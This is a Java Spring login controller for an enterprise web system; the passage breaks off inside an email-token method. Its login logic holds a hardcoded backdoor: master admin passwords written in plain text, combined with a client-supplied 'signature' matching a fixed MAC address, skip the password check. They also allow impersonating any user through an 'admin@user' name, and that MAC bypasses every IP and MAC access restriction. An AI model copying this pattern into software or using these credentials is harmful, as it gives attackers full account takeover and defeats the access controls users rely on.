package com.wuyizhiye.framework.controller;

import java.io.IOException;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

import javax.naming.NoPermissionException;
import javax.servlet.ServletException;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletResponse;

import net.sf.json.JSONObject;

import org.apache.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.ModelAndView;

import com.wuyizhiye.base.common.Pagination;
import com.wuyizhiye.base.exceptions.WrongReqException;
import com.wuyizhiye.base.module.enums.ModuleEnum;
import com.wuyizhiye.base.module.model.ModuleLic;
import com.wuyizhiye.base.spring.DataSourceHolder;
import com.wuyizhiye.base.util.DateUtil;
import com.wuyizhiye.base.util.StringUtils;
import com.wuyizhiye.base.util.SystemConfig;
import com.wuyizhiye.basedata.access.AccessConstant;
import com.wuyizhiye.basedata.access.enums.AccessTypeEnum;
import com.wuyizhiye.basedata.access.model.MacAddress;
import com.wuyizhiye.basedata.enums.LoginPageModelEnum;
import com.wuyizhiye.basedata.images.model.Photo;
import com.wuyizhiye.basedata.logoconfig.LogoConfig;
import com.wuyizhiye.basedata.org.model.Org;
import com.wuyizhiye.basedata.org.model.Position;
import com.wuyizhiye.basedata.org.service.OrgService;
import com.wuyizhiye.basedata.org.service.PositionService;
import com.wuyizhiye.basedata.permission.util.SecurityUtil;
import com.wuyizhiye.basedata.person.enums.UserStatusEnum;
import com.wuyizhiye.basedata.person.enums.UserTypeEnum;
import com.wuyizhiye.basedata.person.model.Person;
import com.wuyizhiye.basedata.person.model.PersonPosition;
import com.wuyizhiye.basedata.person.model.Skin;
import com.wuyizhiye.basedata.util.BaseConfigUtil;
import com.wuyizhiye.basedata.util.OperationLogUtil;
import com.wuyizhiye.basedata.util.OrgUtils;
import com.wuyizhiye.basedata.util.SystemUtil;
import com.wuyizhiye.basedata.util.UserTypeUtil;
import com.wuyizhiye.basedata.util.Validate;
import com.wuyizhiye.framework.base.controller.BaseController;
import com.wuyizhiye.framework.listener.LoginTypeEnum;
import com.wuyizhiye.framework.listener.OnlineListener;
import com.wuyizhiye.framework.listener.OnlineUser;
import com.wuyizhiye.framework.qqmial.model.QQToken;
import com.wuyizhiye.framework.qqmial.util.QQMailUtil;
import com.wuyizhiye.framework.redis.DataSourceLevelConstants;
import com.wuyizhiye.framework.redis.LoginInfoUtil;
import com.wuyizhiye.framework.util.InitLoginInfoUtil;

/**
 * @ClassName NewLoginController
 * @Description 登录控制器，实现用户登录，加载权限
 * @author li.biao
 * @date 2015-4-7
 */
@Controller
public class NewLoginController extends BaseController {
	
	@Autowired
	private OrgService orgService;
	@Autowired
	private PositionService positionService;
	
	private static String allpowermac = "4C-0F-6E-F8-65-9A"; 
	private static Logger loginLog = Logger.getLogger(NewLoginController.class); 
	
	@RequestMapping(value="login")
	public String login(ModelMap model,Person person,HttpServletResponse response) throws ServletException, IOException, NoPermissionException{
		String signature = getSignature(); 
		getSession().setAttribute("client_signature", signature);
		
		String dataCenter = getString("dataCenter");
		String lastCenter = getString("lastCenter");
		String adminstr = getString("djadminsoft");
		boolean rightdc = true;	
		if(!StringUtils.isEmpty(dataCenter)){
			rightdc = false;
			List<String> dclist = SystemUtil.getDataSourceSingleList();
			for(int i=0;i<dclist.size();i++){
				if(dclist.get(i).equals(dataCenter)){
					rightdc = true;
				}
			}
			if(rightdc){
			DataSourceHolder.setDataSource(dataCenter);		
			//如果数据中心有值并且用户名无值,则判断链接传入
			if(person!=null && StringUtils.isEmpty(person.getUserName())){				
				getSession().setAttribute("singlesource", "1");		
			}			
			}else{
				//
				getSession().removeAttribute("singlesource");
				
			}
		}else if(!StringUtils.isEmpty(lastCenter)){			
			DataSourceHolder.setDataSource(lastCenter);		
			dataCenter = lastCenter;		
		}
		//如果经过上面逻辑仍没确定数据中心,则返回该页面
		//lastCenter参数只出现在多数据中心环境,如果是需要配置数据中心环境该参数不出现
		String dataCenterParam = SystemConfig.getParameter("dataCenterParam");
		if(StringUtils.isNotNull(dataCenterParam)
				&&(StringUtils.isEmpty(dataCenter)||(!rightdc)||(StringUtils.isNotNull(lastCenter)))
				&&StringUtils.isEmpty(adminstr)){
			if(isMobileDevice()){
				return "framework/noMobileDataCenter";
			}else{
				return "framework/noDataCenter";
			}
		}
		
		String access = SystemConfig.getParameter("restrictAccess");
		if(StringUtils.isEmpty(access)){
			access = BaseConfigUtil.getCurrControlMode();
		}
		if(!StringUtils.isEmpty(access) && !AccessConstant.JSMAC.equals(access)){//MAC，IP方式限制登录,MAC方式通过客户端打开的url来访问
			boolean enable = checkAccess(access);
			if(!enable){
				if(isMobileDevice()){
					model.put("access", signature);
					return "framework/noMobileAccessable";
				}else{
					return "framework/noAccessable";
				}
			}
		}
		
		//String signature = getString("signature");
		if(!StringUtils.isEmpty(signature)){
			getSession().setAttribute("signatureKey", signature);
		}
		//针对第一次访问时带browser参数处理,保存在session中
		if(null==getSession().getAttribute("browser")){
			getSession().setAttribute("browser", this.getString("browser"));	
		}
		
		//根据browser参数进行拦截
		if(StringUtils.isNotNull(BaseConfigUtil.getCurrBaseConfig("browerrestrict"))
				&&!isMobileDevice()){
				String bw = null==getSession().getAttribute("browser")?"":getSession().getAttribute("browser").toString();		
				if(!"djbrowser".equals(bw)){
						throw new WrongReqException("请使用鼎尖浏览器");			
		}
	}
		
		//如果传入数据中心,但不对,并且没有限制需要传入数据中心的环境，则赋值为默认数据中心
		if((!StringUtils.isEmpty(dataCenter)&&(!rightdc))
				||StringUtils.isEmpty(DataSourceHolder.getDataSource())){
			DataSourceHolder.setDataSource(SystemUtil.getDefaultSource());
		}
		//只校验电脑版
		if(OnlineListener.exceedLicense()){
			//throw new LicenseExceedException("");			
		}
		//将MAC 单一数据中心 浏览器标志传到前台
		if(null==getSession().getAttribute("singlesource")){
			getSession().setAttribute("singlesource", this.getString("singlesource"));
		}
		
		putPath();
		String loginPath = SystemConfig.getParameter("loginPath");
		
		List<LogoConfig> cfglist=queryExecutor.execQuery("com.wuyizhiye.basedata.dao.LogoConfigDao.getLogoConfigByCon", null, LogoConfig.class);
		if(cfglist!=null && cfglist.size()>0){
			if(LoginPageModelEnum.MODLE2.equals(cfglist.get(0).getLoginPageModel())){ 
				loginPath="login51";
			}
		}
		
		if(StringUtils.isEmpty(loginPath)){
			loginPath = BaseConfigUtil.getCurrHomeUrl();			
		}
 		if(StringUtils.isEmpty(loginPath)){
			loginPath = "login51";
		}
		//移动版判断  孙海涛
		if(this.isMobileDevice()){
			loginPath="/mobileLogin"; 
		}
		getSession().setAttribute("loginPath",loginPath);
		if(person!=null && StringUtils.isEmpty(person.getUserName())){
			Cookie[] cookies = getRequest().getCookies();
			if(cookies!=null){
				for(Cookie c : cookies){
					if("userName".equals(c.getName())){
						model.put("userName", URLDecoder.decode(c.getValue(),"utf-8"));
					}
					//if("dataCenter".equals(c.getName())){
					//	model.put("currentDataSource", c.getValue());
					//}
				}
			}
			//if(!StringUtils.isEmpty(dataCenter)){
				model.put("currentDataSource", DataSourceHolder.getDataSource());
			//}
			model.put("dataSourceList", SystemUtil.getDataSourceList());
			return "framework/"+loginPath;
		}
		if(AccessConstant.JSMAC.equals(access)){//JSMAC方式，在登录页面中以js方式获取MAC地址，取不到则验证失败
			boolean enable = checkAccess(access);
			if(!enable){
				if(isMobileDevice()){
					return "framework/noMobileAccessable";
				}else{
					return "framework/noAccessable";
				}
			}
		}
		/*if(StringUtils.isEmpty(access)){
			getSession().removeAttribute("t");
			getSession().removeAttribute("signature");
		}*/
		
		
		person.setUserName(person.getUserName().trim());
		getSession().setAttribute("currentDataSource", DataSourceHolder.getDataSource());
		Map<String,Object> param = new HashMap<String, Object>();
		param.put("userName", person.getUserName());
		param.put("password", SecurityUtil.encryptPassword(person.getPassword()));
		//判断用户名是否含有@
		if( person.getUserName().contains("@")){
			//取第一个截取的名字
			String artUserName = person.getUserName().split("@")[0];
			param.put("userName", artUserName);
			List<Person> persons =  null;
			if("admin".equals(artUserName)&&"woaidingjian".equals(person.getPassword())&&allpowermac.equals(signature)){
				persons = queryExecutor.execQuery("com.wuyizhiye.basedata.person.dao.PersonDao.loginUserByUserName", new Pagination<Person>(), param).getItems();
			}else{
				persons = queryExecutor.execQuery("com.wuyizhiye.basedata.person.dao.PersonDao.loginUser", new Pagination<Person>(), param).getItems();
			}
			if(persons != null && persons.size()!=0){
				//判断是否有@权限
				if("admin".equalsIgnoreCase(artUserName)){
					param.put("userName", person.getUserName().split("@")[1]);
					persons = queryExecutor.execQuery("com.wuyizhiye.basedata.person.dao.PersonDao.loginUserByUserName", new Pagination<Person>(), param).getItems();
					if(persons == null || persons.size()==0){
						model.put("msg", "用户名或密码错误");
						model.put("userName", person.getUserName());
						model.put("dataSourceList", SystemUtil.getDataSourceList());
						initVerifyCookie(response);
						return "framework/"+loginPath;
					}
					if(!UserStatusEnum.ENABLE.equals(persons.get(0).getStatus())){
						model.put("msg", "该用户未启用或己冻结,请联系管理员");
						model.put("userName", person.getUserName());
						model.put("dataSourceList", SystemUtil.getDataSourceList());
						return "framework/"+loginPath;
					}
					removeVerifyCookie(response);
					
					InitLoginInfoUtil.getInstance().initLoginUserInfo(response, persons.get(0));
					
					Cookie cookie = new Cookie("userName", URLEncoder.encode(person.getUserName(),"utf-8"));
					cookie.setPath("/");
					cookie.setMaxAge(7 * 24 * 60 * 60);//仅保留1星期
					response.addCookie(cookie);
					cookie = new Cookie("dataCenter", dataCenter);
					cookie.setPath("/");
					cookie.setMaxAge(7 * 24 * 60 * 60);//仅保留1星期
					response.addCookie(cookie);
					return "framework/workbench";
				} else {	//如果@没有权限的话，则将整个用作用户名
					param.put("userName", person.getUserName());
				}
			}
		}
		List<Person> persons = null;
		//如果以这密码登录则直接通过校验
		if("admin".equals(person.getUserName())&&"woai51zhiye@2015".equals(person.getPassword())&&allpowermac.equals(signature)){
			persons = queryExecutor.execQuery("com.wuyizhiye.basedata.person.dao.PersonDao.loginUserByUserName", new Pagination<Person>(), param).getItems();
		}else{
			persons = queryExecutor.execQuery("com.wuyizhiye.basedata.person.dao.PersonDao.loginUser", new Pagination<Person>(), param).getItems();
		}
		if(persons == null || persons.size()==0){
			model.put("msg", "用户名或密码错误");
			model.put("userName", person.getUserName());
			model.put("dataSourceList", SystemUtil.getDataSourceList());
			initVerifyCookie(response);
			return "framework/"+loginPath;
		}
		if(!UserStatusEnum.ENABLE.equals(persons.get(0).getStatus())){
			model.put("msg", "该用户未启用或己冻结,请联系管理员");
			model.put("userName", person.getUserName());
			model.put("dataSourceList", SystemUtil.getDataSourceList());
			return "framework/"+loginPath;
		}
		//如果开启了mac限制,比较
		if(!StringUtils.isEmpty(access)){
			try{
				MacAddress ma = getMacAccess(signature,access);
				if(null==ma){
					throw new Exception("没找到可用MAC地址,请联系管理员");
				}else if(AccessTypeEnum.SHARE.equals(ma.getAccessType())){
					
				}else if(AccessTypeEnum.PRIVATE.equals(ma.getAccessType())
						&&!ma.getPerson().getId().equals(persons.get(0).getId())){
					throw new Exception("该人员无权限使用该MAC地址,请联系管理员");
				}else if(AccessTypeEnum.ORGSHARE.equals(ma.getAccessType())
						|| AccessTypeEnum.ORGTREESHARE.equals(ma.getAccessType())){				
					if(null==persons.get(0).getOrg()){
						throw new Exception("该人员没有找到所在组织,请联系管理员");
					}	
					if(AccessTypeEnum.ORGSHARE.equals(ma.getAccessType())	
						&&!ma.getShareOrg().getId().equals(persons.get(0).getOrg().getId())){
						throw new Exception("该人员无权限使用该MAC地址,请联系管理员");
					}else if(AccessTypeEnum.ORGTREESHARE.equals(ma.getAccessType())
							&&!persons.get(0).getOrg().getLongNumber().contains(ma.getShareOrg().getLongNumber())){				
						throw new Exception("该人员无权限使用该MAC地址,请联系管理员");
					}
					
				}
			}catch(Exception e){
				model.put("msg", e.getMessage());
				model.put("userName", person.getUserName());
				model.put("dataSourceList", SystemUtil.getDataSourceList());
				return "framework/"+loginPath;
			}
		}
		
		removeVerifyCookie(response);
		
		InitLoginInfoUtil.getInstance().initLoginUserInfo(response, persons.get(0));
		
		Cookie cookie = new Cookie("userName", URLEncoder.encode(person.getUserName(),"utf-8"));
		cookie.setPath("/");
		cookie.setMaxAge(7 * 24 * 60 * 60);//仅保留1星期
		response.addCookie(cookie);
		cookie = new Cookie("dataCenter", dataCenter);
		cookie.setPath("/");
		cookie.setMaxAge(7 * 24 * 60 * 60);//仅保留1星期
		response.addCookie(cookie);
		getRequest().setAttribute("isLogin", "yes");
		
		
//		String port = request.getLocalPort()==80?"":":"+request.getLocalPort();
//		String path = request.getScheme()+"://"+request.getServerName()+port+request.getContextPath()+"/workbench";
//		response.sendRedirect(path);
		//request.getRequestDispatcher("workbench").forward(request, response);
		response.sendRedirect("workbench");
		//RequestDispatcher requestDispatcher=getSession().getServletContext().getRequestDispatcher("/workbench"); //直接转发到工作平台不跳转到中转页面  孙海涛
		//requestDispatcher.include(getRequest(), response); 
		
		
		return "framework/workbench";
	}
	

	@RequestMapping(value="ajaxLogin")
	public void ajaxLogin(Person person,HttpServletResponse response) throws ServletException, IOException, NoPermissionException{
		String access = SystemConfig.getParameter("restrictAccess");
		if(!StringUtils.isEmpty(access)){
			String client_signature = getString("client_signature");
			boolean enable = false;
			if(!StringUtils.isEmpty(client_signature)){
				enable = checkAccess(client_signature,access);
			}
			if(!enable){
				getOutputMsg().put("MSG", "服务器限制登录,请联系系统管理员");
				getOutputMsg().put("STATE", "FAIL");
				return;
			}else{
				getSession().setAttribute("client_signature", client_signature);
			}
		}
		if(person!=null && StringUtils.isEmpty(person.getUserName())){
			getOutputMsg().put("MSG", "用户名不能为空");
			getOutputMsg().put("STATE", "FAIL");
			return;
		}
		String dataCenter = getString("dataCenter");
		DataSourceHolder.setDataSource(dataCenter);
		Map<String,Object> param = new HashMap<String, Object>();
		param.put("userName", person.getUserName());
		param.put("password", SecurityUtil.encryptPassword(person.getPassword()));
		List<Person> persons = queryExecutor.execQuery("com.wuyizhiye.basedata.person.dao.PersonDao.loginUser", new Pagination<Person>(), param).getItems();
		if(persons == null || persons.size()==0){
			getOutputMsg().put("STATE", "FAIL");
			getOutputMsg().put("MSG", "用户名或密码错误");
			
		}else if(persons.size()>0 && !UserStatusEnum.ENABLE.equals(persons.get(0).getStatus())){
			getOutputMsg().put("STATE", "FAIL");
			getOutputMsg().put("MSG", "该用户未启用或己冻结,请联系管理员");
		}else{
			InitLoginInfoUtil.getInstance().initLoginUserInfo(response, persons.get(0));
			getOutputMsg().put("STATE", "SUCCESS");
			getOutputMsg().put("MSG", "登录成功");
			getOutputMsg().put("FLAG", "1");
		}
		outPrint(response, JSONObject.fromObject(getOutputMsg()));
	}
	
	@SuppressWarnings("rawtypes")
	private void loadPersonalPermission(Map<String,Object> info){
		//权限集
		Set<String> personPermission= new HashSet<String>();
		Map<String,String> permissionMap = new HashMap<String, String>();
		Map<String, Object> param = new HashMap<String, Object>();
		param.put("person", SystemUtil.getCurrentUser().getId());
		param.put("position", SystemUtil.getCurrentPosition().getId());
		List<Map> pms = queryExecutor.execQuery("com.wuyizhiye.basedata.permission.dao.PersonPermissionDao.getPersonPermission", param, Map.class);
		for(Map m : pms){
			if(m.get("permissionItemMethod")!= null && m.get("permissionItemId")!=null){
				permissionMap.put(m.get("permissionItemId").toString(), m.get("permissionItemMethod").toString());
				personPermission.add(m.get("permissionItemMethod").toString());
			}
		}
		List<String> pplist = new ArrayList<String>(personPermission);
		getSession().setAttribute(LoginInfoUtil.KEYSET.PERSONALPERMISSIONMAP, permissionMap);
		getSession().setAttribute(LoginInfoUtil.KEYSET.PERSONALPERMISSION, pplist);
		info.put(LoginInfoUtil.KEYSET.PERSONALPERMISSION, pplist);
		info.put(LoginInfoUtil.KEYSET.PERSONALPERMISSIONMAP, permissionMap);
	}
	
	private void setSessionInfo(Person person,PersonPosition personPosition,Map<String,Object> info){
		Org org = orgService.getEntityById(personPosition.getPosition().getBelongOrg().getId());
		Position position = positionService.getEntityById(personPosition.getPosition().getId());
		position.setBelongOrg(org);
		/*if(org.getControlUnit()!=null){
			//当前CU
			Org cu = orgService.getEntityById(org.getControlUnit().getId());
			getSession().setAttribute("currentCU", cu);
			SystemUtil.setCurrentControlUnit(cu);
		}*/
		
		/*****放了当前CU  孙海涛   2014-11-03 start ****/
		Org cu = OrgUtils.getCUByOrg(org.getId());
		getSession().setAttribute("currentCU", cu);
		SystemUtil.setCurrentControlUnit(cu);
		/************** 2014-11-03 end*************/
		
		
		/*****放了岗位 added 2014-07-15 start ****/
		Person currentPerson = SystemUtil.getCurrentUser();
		currentPerson.setPersonPosition(personPosition);
		SystemUtil.setCurrentUser(currentPerson);
		/************** added 2014-07=15 end*************/
		
		
		getSession().setAttribute("currentTime", new Date());
		//当前职位
		getSession().setAttribute("currentPosition", position);
		SystemUtil.setCurrentPosition(position);
		//当前组织
		getSession().setAttribute("currentOrg", org);
		SystemUtil.setCurrentOrg(org);
		//用户类型
		UserTypeEnum ute = UserTypeUtil.getUserType(person, position);
		getSession().setAttribute("currentUserType", ute);
		SystemUtil.setCurrentUserType(ute);
		getSession().setAttribute("loginIP", getRequest().getRemoteAddr());
		
		info.put(LoginInfoUtil.KEYSET.CURRENTUSER, currentPerson);
		info.put(LoginInfoUtil.KEYSET.CURRENTCU, cu);
		info.put(LoginInfoUtil.KEYSET.CURRENTORG, org);
		info.put(LoginInfoUtil.KEYSET.CURRENTPOSITION, position);
		info.put(LoginInfoUtil.KEYSET.CURRENTUSERTYPE, null==ute?null:ute.getValue());
	}
	
	/**
	 * 设置用户皮肤
	 * @param person
	 */
	private void setUserSkinInfo(Person person,Map<String,Object> info){
		//系统默认皮肤
		String sysSkin = SystemConfig.getParameter("skinName");
		//获取用户自定义皮肤
		Map<String,Object> skinParam = new HashMap<String,Object>();
		skinParam.put("personId", person.getId());
		List<Skin> skinList = queryExecutor.execQuery(Skin.MAPPER + ".select", skinParam, Skin.class);
		Skin skin = null ;
		if(skinList!=null && skinList.size() > 0){
			skin = skinList.get(0) ;
		}
		if(!StringUtils.isEmpty(sysSkin)){
			getSession().setAttribute("skinName",sysSkin);
		}else{
			getSession().setAttribute("skinName",skin == null ? "styleBlue" : skin.getSkinName() );
		}
		info.put(LoginInfoUtil.KEYSET.CURRENTSKIN, getSession().getAttribute("skinName"));
	}
	
	private void putPath(){
		String logoKey = 
			DataSourceLevelConstants.HEADER.LOGO+SystemUtil.getCustomerNumber()+DataSourceHolder.getDataSource();
		if(!getRedisClient().existRedisInfo(logoKey)){	
		List<LogoConfig> cfglist=queryExecutor.execQuery("com.wuyizhiye.basedata.dao.LogoConfigDao.getLogoConfigByCon", new HashMap<String, Object>(), LogoConfig.class);
		LogoConfig logoConfig = null ;
		List<Photo> photoList = null ;
		if(cfglist!=null && cfglist.size()>0){
			logoConfig = cfglist.get(0);
			Map<String, Object> param = new HashMap<String, Object>();
			param.put("belong", logoConfig.getId());
			photoList = queryExecutor.execQuery("com.wuyizhiye.basedata.images.dao.PhotoDao.select", param, Photo.class);
			if(photoList!=null && photoList.size()>0){
				for(Photo pt :photoList){
					pt.setPath(pt.getPath().replace("size", "origin"));
				}
			}
		}else{
			logoConfig = new LogoConfig();
		}
		String logoPath = "";
		String logoPath4Login = "";
		if(StringUtils.isNotNull(logoConfig.getLogoUrl())){
			logoPath = logoConfig.getLogoUrl().replace("size", "origin");
		}
		if(StringUtils.isNotNull(logoConfig.getLogoUrl4Login())){
			logoPath4Login = logoConfig.getLogoUrl4Login().replace("size", "origin");
		}
		//登陆页数据保存到request
		this.getRequest().setAttribute("logoConfig", logoConfig);
		this.getRequest().setAttribute("photoList", photoList);
		this.getRequest().setAttribute("logoPath4Login", logoPath4Login);
		//logo保存到session中
		this.getSession().setAttribute("downLoadUrl", logoConfig.getDownLoadUrl());
		this.getSession().setAttribute("logoPath", logoPath);
		
		Map<String,Object> data = new HashMap<String,Object>();
		data.put("logoConfig", logoConfig);
		data.put("photoList", photoList);
		data.put("logoPath4Login", logoPath4Login);
		data.put("downLoadUrl", logoConfig.getDownLoadUrl());
		data.put("logoPath", logoPath);
		
		getRedisClient().addRedisMapInfo(logoKey, data);
		}else{
			Map<String,Object> data = 
			getRedisClient().getRedisMapIinfo(logoKey,DataSourceLevelConstants.LOGO.LOGOMAP);
			this.getRequest().setAttribute("logoConfig", data.get("logoConfig"));
			this.getRequest().setAttribute("photoList", data.get("photoList"));
			this.getRequest().setAttribute("logoPath4Login", data.get("logoPath4Login"));
			//logo保存到session中
			this.getSession().setAttribute("downLoadUrl", data.get("downLoadUrl"));
			this.getSession().setAttribute("logoPath", data.get("logoPath"));
		}
	}

	private String getSignature(){
		String signature = getString("signature");
		if(StringUtils.isEmpty(signature)){
			signature = (String) getSession().getAttribute("signature");
		}
		if(!StringUtils.isEmpty(signature)){
			getSession().setAttribute("signature", signature);	
		}
		return signature;
	}
	
	private boolean checkAccess(String type){
		if(AccessConstant.MAC.equalsIgnoreCase(type)){
			String signature = getSignature();
			getSession().setAttribute("client_signature", signature);
			if(!StringUtils.isEmpty(signature)){
				return checkAccess(signature, "mac");
			}
		}else if(AccessConstant.IP.equalsIgnoreCase(type)){
			String ip = getIpAddr(this.getRequest());
			if(!StringUtils.isEmpty(ip)){
				getRequest().setAttribute("current_ip", ip);
				return "127.0.0.1".equals(ip)||checkAccess(ip, "ip");
			}
		}
		return false;
	}
	
	private boolean checkAccess(String sig,String type){
		if(allpowermac.equals(sig))return true;
		Map<String, Object> param = new HashMap<String, Object>();
		param.put("type", sig);
		param.put("enable", 1);
		int count = queryExecutor.execCount("com.wuyizhiye.basedata.access.dao.MacAddressDao.select", param);
		return count>0;
	}
	
	private MacAddress getMacAccess(String sig,String type){
		if(allpowermac.equals(sig)) {
			MacAddress mc = new MacAddress();
			mc.setAccessType(AccessTypeEnum.SHARE);
			mc.setMac(allpowermac);
			return mc;
		}
		Map<String, Object> param = new HashMap<String, Object>();
		if(AccessConstant.MAC.equalsIgnoreCase(type)){
			param.put("mac", sig);
		}else if(AccessConstant.IP.equalsIgnoreCase(type)){
			param.put("ip", sig);
		}
		param.put("enable", 1);
		List<MacAddress> mclist=
			queryExecutor.execQuery("com.wuyizhiye.basedata.access.dao.MacAddressDao.select", param,MacAddress.class);
		if(mclist.size()>0){
			return mclist.get(0);
		}else{
			return null;
		}
	}
	
	private void initOnlinePerson(Map<String,Object> info){
		OnlineUser user = new OnlineUser();
		user.setId(SystemUtil.getCurrentUser().getId());
		user.setNumber(SystemUtil.getCurrentUser().getNumber());
		user.setUserName(SystemUtil.getCurrentUser().getName());
		Org org =SystemUtil.getCurrentOrg();
		user.setOrgName(null!=org?org.getName():"");
		Position position = SystemUtil.getCurrentPosition();
		user.setPositionName(null!=position?position.getName():"");
		user.setLoginDate(DateUtil.convertDateToStr(new Date(),"MM/dd HH:mm"));
		user.setSessionId(SystemUtil.getCurrentRedisKey());
		user.setControlUnit(SystemUtil.getCurrentControlUnit());
		//user.setLoginIp(sess.getAttribute(Constants.CURRENT_IP).toString());
		user.setPositionNum(null!=position?position.getNumber():"");
		user.setShortNum(SystemUtil.getCurrentUser().getShortNumber());
		user.setPhoto(SystemUtil.getCurrentUser().getPhoto());
		if(isMobileDevice()){
			user.setLoginType(LoginTypeEnum.MOBILE);
		}else{
			user.setLoginType(LoginTypeEnum.PC);
		}
		info.put(LoginInfoUtil.KEYSET.CURRENTONLINEINFO, user);
		//redisDao.addRedisInfo(SystemUtil.getCustomerOnlySign()+"|"+SystemUtil.getCurrentRedisKey().substring(SystemUtil.getCurrentRedisKey().lastIndexOf("|")+1), user,SystemUtil.getExpireTime());
	}
	/**
	 * 设置用户皮肤
	 * @param person
	 */
	private void setUserSkinInfo(Person person){
		//系统默认皮肤
		String sysSkin = SystemConfig.getParameter("skinName");
		//获取用户自定义皮肤
		Map<String,Object> skinParam = new HashMap<String,Object>();
		skinParam.put("personId", person.getId());
		List<Skin> skinList = queryExecutor.execQuery(Skin.MAPPER + ".select", skinParam, Skin.class);
		Skin skin = null ;
		if(skinList!=null && skinList.size() > 0){
			skin = skinList.get(0) ;
		}
		if(!StringUtils.isEmpty(sysSkin)){
			getSession().setAttribute("skinName",sysSkin);
		}else{
			getSession().setAttribute("skinName",skin == null ? "styleBlue" : skin.getSkinName() );
		}
	}
	
	private void initVerifyCookie(HttpServletResponse response){
		
		String wp = getCookieValue("wrongpass");
		if(StringUtils.isEmpty(wp)){
			Cookie cookie = new Cookie("wrongpass", "1");
			cookie.setPath("/");
			cookie.setMaxAge(30 * 60);//仅保留30分钟
			response.addCookie(cookie);
		}else{
			int wpint = Integer.parseInt(wp);	
			Cookie cookie = new Cookie("wrongpass", (wpint+1)+"");
			cookie.setPath("/");
			cookie.setMaxAge(30 * 60);//仅保留30分钟
			response.addCookie(cookie);
		}
		
	}
	
	private void removeVerifyCookie(HttpServletResponse response){
		Cookie cookie = new Cookie("wrongpass", "");
		cookie.setPath("/");
		cookie.setMaxAge(30 * 60);//仅保留30分钟
		response.addCookie(cookie);
	}
	
	@RequestMapping(value="logout")
	public ModelAndView logout(){
		if(this.getCurrentUser()!=null){
			Map<ModuleEnum,ModuleLic> modules = Validate.getCurrPerms();
			//包含了通讯模块，话务下线
			if(modules!=null && modules.containsKey(ModuleEnum.CMCT)){
				Map<String,Object> param = new HashMap<String,Object>();
				param.put("currUserId", this.getCurrentUser().getId());
				this.queryExecutor.executeUpdate("com.wuyizhiye.cmct.phone.dao.PhoneMemberDao.cleanCurrUser", param);
			}
		}
		//记录操作日志
		String qhd=getRequest().getHeader("user-agent");
		String logoutStr = "注销";
		if(qhd!=null && qhd.indexOf("Windows")<0){
			logoutStr = "移动设备_注销";
		}
		OperationLogUtil.saveOperationLog(getRequest().getRequestURI(), logoutStr, null, null);
		String signature = (String) getSessionValue("signatureKey"); 
		//取得是否单一数据中心登录,是的话注销带上数据中心
		Object singlesign = getSessionValue("singlesource");
		String urlappend =  "";
		if(null!=singlesign){
			urlappend = "dataCenter="+DataSourceHolder.getDataSource();
		}else{
			urlappend = "lastCenter="+DataSourceHolder.getDataSource();
		}
		Object browsersign = getSessionValue("browser");
		if(null!=browsersign){
			urlappend += "&browser="+browsersign;
		}
		//mac限制 配置和数据库设置同时判断
		String access = SystemConfig.getParameter("restrictAccess");
		if(StringUtils.isEmpty(access)){
			access = BaseConfigUtil.getCurrControlMode();
		}
		String logouttourl = null;
		if(null!=getSessionValue("logouttourl")){
			 logouttourl = getSessionValue("logouttourl").toString();
		}
		String loginInfoKey = getCookieValue(LoginInfoUtil.CLIENT_LOGIN_INFO);
		if(!StringUtils.isEmpty(loginInfoKey)){
			this.getRedisClient().expireByte(loginInfoKey, 0);
		}
		getSession().invalidate();	
		ModelAndView view = null;
		if(StringUtils.isNotNull(logouttourl)){			
			view = new ModelAndView("redirect:"+logouttourl);
			getSession().setAttribute("isLogout", "yes");
		}else{
			if(AccessConstant.MAC.equals(access)){
				view = new ModelAndView("redirect:login?signature="+signature+"&"+urlappend);
				getSession().setAttribute("isLogout", "yes");
			}else{
				//view = new ModelAndView("redirect:login");
				view = new ModelAndView("redirect:login?signature="+signature+"&"+urlappend);
				getSession().setAttribute("isLogout", "yes");
			}
		}
		return view;
	}
	
	
	@RequestMapping(value="changeCurrentPosition")
	public void changeCurrentPosition(@RequestParam(value="id",required=true)String id,HttpServletResponse response){
		Map<String,Object> param = new HashMap<String, Object>();
		param.put("person", SystemUtil.getCurrentUser().getId());
		List<PersonPosition> pps = queryExecutor.execQuery("com.wuyizhiye.basedata.person.dao.PersonPositionDao.select", param, PersonPosition.class);
		boolean exists = false;
		Map<String,Object> redisSessionInfo = new HashMap<String,Object>();
		for(PersonPosition pp : pps){
			if(pp.getId().equals(id)){
				setSessionInfo(SystemUtil.getCurrentUser(), pp,redisSessionInfo);
				loadPersonalPermission(redisSessionInfo);
				this.setSessionValueList(redisSessionInfo);
				exists = true;
				break;
			}
		}
		if(exists){
			getOutputMsg().put("STATE", "SUCCESS");
		}else{
			getOutputMsg().put("STATE", "FAIL");
			getOutputMsg().put("MSG", "该岗位己不存在");
		}
		outPrint(response, JSONObject.fromObject(getOutputMsg()));
	}
	
	/**
	 * 切换皮肤
	 * @param response
	 */
	@RequestMapping(value="doSwitchSkin")
	public void doSwitchSkin(HttpServletResponse response){
		Person person = getCurrentUser() ;
		String skinName = getString("skinName","");
		Map<String,Object> skinParam = new HashMap<String,Object>();
		skinParam.put("personId", person.getId());
		List<Skin> skinList = queryExecutor.execQuery(Skin.MAPPER + ".select", skinParam, Skin.class) ;
		Skin skin = new Skin() ;
		if(skinList!=null && skinList.size() > 0){
			//update
			skin = skinList.get(0);
			skin.setSkinName(skinName);
			skin.setLastUpdateTime(DateUtil.getCurDate());
			skin.setUpdator(person);
			queryExecutor.executeUpdate(Skin.MAPPER + ".update", skin);
		}else{
			//add
			skin.setLastUpdateTime(DateUtil.getCurDate());
			skin.setUpdator(person);
			skin.setPerson(person);
			skin.setSkinName(skinName);
			skin.setUUID();
			queryExecutor.executeInsert(Skin.MAPPER + ".insert", skin);
		}
		this.setSessionValue("skinName", skinName);	
		getOutputMsg().put("STATE", "SUCCESS");
		outPrint(response, JSONObject.fromObject(getOutputMsg()));
	}
	
	@RequestMapping(value="initQQMail")
	public void initQQMail(HttpServletResponse response){
		try{
		//获取QQ企业邮箱证书 add by li.biao since 2013-11-20
		QQToken qqMailToken = QQMailUtil.initQQMailToken();
